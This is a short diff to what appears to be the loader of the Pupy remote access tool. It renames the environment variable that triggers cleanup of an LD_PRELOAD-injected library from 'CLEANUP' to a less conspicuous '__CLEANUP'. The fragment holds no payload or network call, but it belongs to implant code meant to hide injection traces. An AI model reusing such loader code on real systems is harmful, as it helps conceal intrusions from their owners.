@@ -9,6 +9,10 @@
 #include "pupy_load.h"
 #include "debug.h"
 
+#ifndef DEFAULT_ENV_CLEANUP
+#define DEFAULT_ENV_CLEANUP "__CLEANUP"
+#endif
+
 static pthread_t thread_id;
 
 static int __argc = 0;
@@ -59,7 +63,7 @@ void loader() {
 	pthread_attr_init(&attr);
 
 	const char *ldpreload = getenv("LD_PRELOAD");
-	const char *cleanup = getenv("CLEANUP");
+	const char *cleanup = getenv(DEFAULT_ENV_CLEANUP);
 
 	if (cleanup && ldpreload && !strcmp(cleanup, "1")) {
 		dprint("Cleanup requested. Cleanup %s\n", ldpreload);
